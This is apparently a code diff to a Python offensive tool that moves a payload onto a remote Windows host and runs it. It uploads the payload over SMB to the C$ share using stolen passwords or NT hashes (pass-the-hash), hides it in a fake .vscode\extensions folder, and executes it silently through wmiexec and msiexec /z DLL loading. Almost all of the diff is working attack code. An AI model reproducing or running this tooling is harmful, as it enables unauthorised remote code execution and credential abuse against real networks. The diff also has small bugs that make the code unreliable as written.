@@ -24,14 +24,35 @@ args = parser.parse_args()
 
 def upload_file(payload, target, domain, user, nthash, password):
     console.log(f"[white] [+] Uploading payload: {payload} to {target}")
-    if nthash:        
-        smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}@{target} -hashes :{nthash} -no-pass -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    if technique == "MSC":
+        smb_commands_msc = ["use C$\n", "cd Windows\n", f"put {payload}\n"]
+        with open("smbcommands.txt", "w") as file:
+            file.writelines(smb_commands_msc)
+
+        if nthash:        
+            smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}@{target} -hashes :{nthash} -no-pass -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        else:
+            smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}:{password}@{target} -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)     
+       
+    elif technique == "DLL":
+        smb_commands_dll = ["use C$\n", "cd users\\public\n", "mkdir .vscode\n", "cd .vscode\n", "mkdir extensions\n", "cd extensions\n" f"put {payload}\n"]
+        with open("smbcommands.txt", "w") as file:
+            file.writelines(smb_commands_dll)
+
+        if nthash:        
+            smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}@{target} -hashes :{nthash} -no-pass -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        else:
+            smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}:{password}@{target} -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     else:
-        smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}:{password}@{target} -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        console.log("[red] [-] Error pick a technique, DLL or MSC!")
     
     stdout, stderr = smbclient.communicate()
 
-    print(stdout.decode(), stderr.decode())
+    if stdout:
+       print(stdout.decode())
+
+    if stderr:
+       print(stderr.decode())
 
 def execute_payload(payload, target, domain, user, nthash, technique, password):
     console.log(f"[white] [+] Executing payload: {payload} on {target}")
@@ -49,14 +70,16 @@ def execute_payload(payload, target, domain, user, nthash, technique, password):
     elif technique == "DLL":
         if nthash:
             wmiexec = subprocess.Popen(
-                f"wmiexec.py -silentcommand -nooutput -hashes :{nthash} -no-pass {domain}/{user}@{target} \"C:\\Windows\\System32\\msiexec.exe /z \\\"C:\\Windows\\{payload}\\\"\"",
+                f"wmiexec.py -silentcommand -nooutput -hashes :{nthash} -no-pass {domain}/{user}@{target} \"C:\\Windows\\System32\\msiexec.exe /z \\\"C:\\Users\\Public\\.vscode\\extensions\\{payload}\\\"\"",
                 shell=True
             )
         else:
             wmiexec = subprocess.Popen(
-                f"wmiexec.py -silentcommand -nooutput {domain}/{user}:{password}@{target} \"C:\\Windows\\System32\\msiexec.exe /z \\\"C:\\Windows\\{payload}\\\"\"",
+                f"wmiexec.py -silentcommand -nooutput {domain}/{user}:{password}@{target} \"C:\\Windows\\System32\\msiexec.exe /z \\\"C:\\Users\\Public\\.vscode\\extensions\\{payload}\\\"\"",
                 shell=True
             )
+    else:
+        console.log("[red] [-] Error pick a technique, DLL or MSC!")
 
 
     stdout, stderr = wmiexec.communicate()
@@ -76,16 +99,12 @@ if __name__ == "__main__":
     domain = args.domain
     target = args.target
     payload = args.payload
-    technique = args.technique
-    
-    smb_commands = ["use C$\n", "cd Windows\n", f"put {payload}\n"]
+    technique = args.technique 
 
     if os.path.exists("smbcommands.txt"):
         os.remove("smbcommands.txt")
 
     console.log("[white] [+] Generating smbcommands file")
-    with open("smbcommands.txt", "w") as file:
-        file.writelines(smb_commands)
 
     upload_file(payload, target, domain, user, nthash, password)
 
@@ -96,12 +115,3 @@ if __name__ == "__main__":
     console.log("[white] [+] Cleaning up....")
 
     os.remove("smbcommands.txt")
-
-    
-
-
-
-
-
-
-
